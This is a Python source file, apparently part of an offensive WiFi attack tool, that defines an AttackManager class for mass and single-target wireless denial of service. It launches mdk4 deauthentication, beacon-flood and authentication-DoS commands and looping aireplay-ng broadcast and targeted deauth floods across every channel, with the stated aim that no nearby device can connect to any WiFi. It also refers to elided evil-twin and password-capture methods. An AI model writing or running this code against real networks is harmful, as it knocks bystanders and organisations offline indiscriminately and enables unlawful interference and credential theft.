#!/usr/bin/env python3

import os
import time
import threading
import subprocess
from typing import List

class AttackManager:
    def __init__(self, core, scanner):
        self.core = core
        self.scanner = scanner
        self.attack_processes = []
        self.attack_running = False
        self.attack_threads = []
        self.evil_twin_running = False
        self.captured_password = None

    def ultra_mass_destruction(self):
        """ULTRA POWERFUL MASS DESTRUCTION - Complete WiFi annihilation"""
        print("\033[1;31m[💀] INITIATING ULTRA MASS DESTRUCTION PROTOCOL...\033[0m")
        print("\033[1;33m[⚠️] WARNING: This will completely jam ALL WiFi networks in range!\033[0m")
        print("\033[1;33m[⚠️] No device will be able to connect until attack stops!\033[0m")
        
        # First scan for networks
        print("\033[1;33m[!] SCANNING FOR TARGET NETWORKS...\033[0m")
        if not self.scanner.wifi_scan(duration=15):
            print("\033[1;31m[✘] NO NETWORKS FOUND - CANNOT START ATTACK\033[0m")
            return
        
        target_count = len(self.scanner.networks)
        
        if target_count == 0:
            print("\033[1;31m[✘] NO TARGET NETWORKS FOUND\033[0m")
            return
        
        print(f"\033[1;32m[✓] FOUND {target_count} TARGET NETWORKS\033[0m")
        self.scanner.display_scan_results()
        
        confirm = input("\033[1;31m[?] CONFIRM MASS DESTRUCTION OF ALL {target_count} NETWORKS? (y/N): \033[0m")
        
        if confirm.lower() not in ['y', 'yes']:
            print("\033[1;33m[!] MASS DESTRUCTION CANCELLED\033[0m")
            return
        
        self.core.set_current_operation("ULTRA_MASS_DESTRUCTION")
        self.attack_running = True
        
        print("\033[1;31m[💣] DEPLOYING NUCLEAR WEAPONS...\033[0m")
        
        # Get all target networks
        targets = list(self.scanner.networks.values())
        
        # Weapon 1: MDK4 Complete Destruction on all channels
        print("\033[1;31m[⚡] WEAPON 1: MDK4 TOTAL ANNIHILATION\033[0m")
        proc1 = self.core.run_command(
            f"mdk4 {self.core.mon_interface} d -c 1,2,3,4,5,6,7,8,9,10,11,12,13,14",
            background=True
        )
        if proc1:
            self.attack_processes.append(proc1)
            self.core.add_attack_process(proc1)
        
        # Weapon 2: Beacon Flood Chaos
        print("\033[1;31m[⚡] WEAPON 2: BEACON FLOOD CHAOS\033[0m")
        proc2 = self.core.run_command(
            f"mdk4 {self.core.mon_interface} b -s 1000",
            background=True
        )
        if proc2:
            self.attack_processes.append(proc2)
            self.core.add_attack_process(proc2)
        
        # Weapon 3: Authentication DoS
        print("\033[1;31m[⚡] WEAPON 3: AUTHENTICATION DoS\033[0m")
        proc3 = self.core.run_command(
            f"mdk4 {self.core.mon_interface} a -m",
            background=True
        )
        if proc3:
            self.attack_processes.append(proc3)
            self.core.add_attack_process(proc3)
        
        # Weapon 4: Targeted Deauth for each network
        print("\033[1;31m[⚡] WEAPON 4: TARGETED DEAUTH ATTACKS\033[0m")
        deauth_thread = threading.Thread(target=self.targeted_deauth_attack, args=(targets,))
        deauth_thread.daemon = True
        deauth_thread.start()
        
        # Weapon 5: Continuous Broadcast Deauth
        print("\033[1;31m[⚡] WEAPON 5: BROADCAST DEAUTH FLOOD\033[0m")
        broadcast_thread = threading.Thread(target=self.broadcast_deauth_flood)
        broadcast_thread.daemon = True
        broadcast_thread.start()
        
        print(f"\033[1;32m[✓] {len(self.attack_processes)+2} NUCLEAR WEAPONS DEPLOYED\033[0m")
        print(f"\033[1;31m[💥] ATTACKING {target_count} NETWORKS - TOTAL WIFI JAMMING!\033[0m")
        print("\033[1;33m[!] NO DEVICE CAN CONNECT TO ANY WIFI UNTIL ATTACK STOPS!\033[0m")
        
        # Start ultra destruction animation
        anim_thread = threading.Thread(target=self.show_ultra_destruction_animation, args=(target_count,))
        anim_thread.daemon = True
        anim_thread.start()
        
        print("\033[1;33m[!] PRESS ENTER TO STOP TOTAL ANNIHILATION...\033[0m")
        input()
        
        self.stop_attacks()
        self.core.clear_current_operation()
        print("\033[1;32m[✓] ULTRA MASS DESTRUCTION TERMINATED\033[0m")

    def targeted_deauth_attack(self, targets):
        """Targeted deauth attack on specific networks"""
        while self.attack_running:
            for target in targets:
                if not self.attack_running:
                    break
                try:
                    # Set channel first
                    self.core.run_command(f"iwconfig {self.core.mon_interface} channel {target['channel']} 2>/dev/null")
                    # Send deauth to specific target
                    self.core.run_command(f"aireplay-ng --deauth 10 -a {target['bssid']} {self.core.mon_interface} 2>/dev/null")
                    time.sleep(0.5)
                except:
                    pass

    def broadcast_deauth_flood(self):
        """Broadcast deauth attack on all channels"""
        channels = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14]
        channel_index = 0
        
        while self.attack_running:
            try:
                # Rotate through channels
                channel = channels[channel_index]
                self.core.run_command(f"iwconfig {self.core.mon_interface} channel {channel} 2>/dev/null")
                # Broadcast deauth
                self.core.run_command(f"aireplay-ng --deauth 50 -D {self.core.mon_interface} 2>/dev/null")
                
                channel_index = (channel_index + 1) % len(channels)
                time.sleep(1)
            except:
                pass

    def show_ultra_destruction_animation(self, target_count):
        """Show ultra destruction animation"""
        frames = ["💀", "☠️", "💣", "🔥", "☢️", "⚡", "💥", "🌋"]
        messages = [
            f"ANNIHILATING {target_count} NETWORKS",
            "JAMMING ALL FREQUENCIES",
            "BLOCKING ALL CONNECTIONS", 
            "TOTAL WIFI BLACKOUT",
            "COMPLETE SIGNAL JAMMING",
            "NO NETWORK CAN SURVIVE"
        ]
        frame_idx = 0
        msg_idx = 0
        
        while self.attack_running:
            frame = frames[frame_idx]
            message = messages[msg_idx]
            frame_idx = (frame_idx + 1) % len(frames)
            msg_idx = (msg_idx + 1) % len(messages)
            print(f"\033[1;31m[{frame}] {message} - NO WIFI CAN CONNECT!\033[0m", end='\r')
            time.sleep(0.3)

    def mass_destruction(self):
        """Legacy mass destruction - redirect to ultra version"""
        print("\033[1;33m[!] REDIRECTING TO ULTRA MASS DESTRUCTION...\033[0m")
        self.ultra_mass_destruction()

    def single_target_attack(self):
        """Nuclear single target destruction"""
        print("\033[1;33m[!] ACQUIRING SINGLE TARGET...\033[0m")
        
        if self.scanner.wifi_scan():
            self.scanner.display_scan_results()
            target = self.scanner.select_target()
            
            if target:
                print(f"\033[1;31m[💣] DEPLOYING NUCLEAR STRIKE ON: {target['essid']}\033[0m")
                self.start_single_attack(target)

    def start_single_attack(self, target):
        """Start nuclear attack on single target"""
        self.core.set_current_operation("SINGLE_TARGET_ATTACK")
        self.attack_running = True
        
        # Set target channel
        self.core.run_command(f"iwconfig {self.core.mon_interface} channel {target['channel']}")
        
        print("\033[1;31m[💣] DEPLOYING NUCLEAR WEAPONS...\033[0m")
        
        # Weapon 1: MDK4 Destruction
        print("\033[1;31m[⚡] WEAPON 1: MDK4 DESTRUCTION\033[0m")
        proc1 = self.core.run_command(
            f"mdk4 {self.core.mon_interface} d -c {target['channel']} -B {target['bssid']}",
            background=True
        )
        if proc1:
            self.attack_processes.append(proc1)
            self.core.add_attack_process(proc1)
        
        # Weapon 2: Infinite Deauth
        print("\033[1;31m[⚡] WEAPON 2: INFINITE DEAUTH\033[0m")
        proc2 = self.core.run_command(
            f"while true; do aireplay-ng --deauth 100 -a {target['bssid']} {self.core.mon_interface} 2>/dev/null; sleep 1; done", 
            background=True
        )
        if proc2:
            self.attack_processes.append(proc2)
            self.core.add_attack_process(proc2)
        
        print(f"\033[1;32m[✓] {len(self.attack_processes)} NUCLEAR WEAPONS DEPLOYED\033[0m")
        print(f"\033[1;31m[💥] TARGET {target['essid']} IS BEING DESTROYED\033[0m")
        
        # Start destruction animation
        anim_thread = threading.Thread(target=self.show_single_target_animation, args=(target['essid'],))
        anim_thread.daemon = True
        anim_thread.start()
        
        print("\033[1;33m[!] PRESS ENTER TO CEASE FIRE...\033[0m")
        input()
        
        self.stop_attacks()
        self.core.clear_current_operation()
        print("\033[1;32m[✓] SINGLE TARGET ATTACK TERMINATED\033[0m")

    def show_single_target_animation(self, target_name):
        """Show single target destruction animation"""
        frames = ["💣", "🔥", "☢️", "⚡", "💥"]
        frame_idx = 0
        
        while self.attack_running:
            frame = frames[frame_idx]
            frame_idx = (frame_idx + 1) % len(frames)
            print(f"\033[1;31m[{frame}] DESTROYING {target_name} - TARGET ELIMINATED!\033[0m", end='\r')
            time.sleep(0.3)

    # ... [Keep all the other methods like router_destroyer, evil_twin, etc. unchanged] ...

    def stop_attacks(self):
        """Stop all running attacks"""
        self.attack_running = False
        self.evil_twin_running = False
        self.core.stop_all_attacks()
        self.attack_processes = []
